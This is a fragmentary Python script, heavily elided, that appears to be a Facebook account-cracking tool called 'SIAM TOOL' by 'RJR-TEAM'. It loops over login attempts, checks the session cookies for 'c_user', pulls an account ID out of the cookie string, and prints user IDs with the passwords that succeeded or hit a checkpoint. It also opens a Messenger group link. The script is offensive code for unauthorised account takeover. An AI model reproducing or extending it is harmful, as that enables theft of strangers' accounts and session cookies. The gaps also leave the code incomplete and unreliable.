...
print('\n\033[1;36m[✓]   WELCOME TO SIAM TOOL');time.sleep(3)
...
os.system(f'xdg-open https://m.me/j/Abb1qG8uNS-Fuvk7/')
#---------------logo----------------#
logo =("""                
...
def clear():
	clr('clear')
	print(logo)
	print('\033[1;37m\033[1;32m[💕] WELCOME TO MR SIAM TOOLS [💖]\033[1;0m\33[1;32m')
	linex()
   ...
   "scheme": 'https',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RJR-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[RJR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;96m[RJR-TEAM]\033[1;97m] %s|\33[1;34m[SUCCESS]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
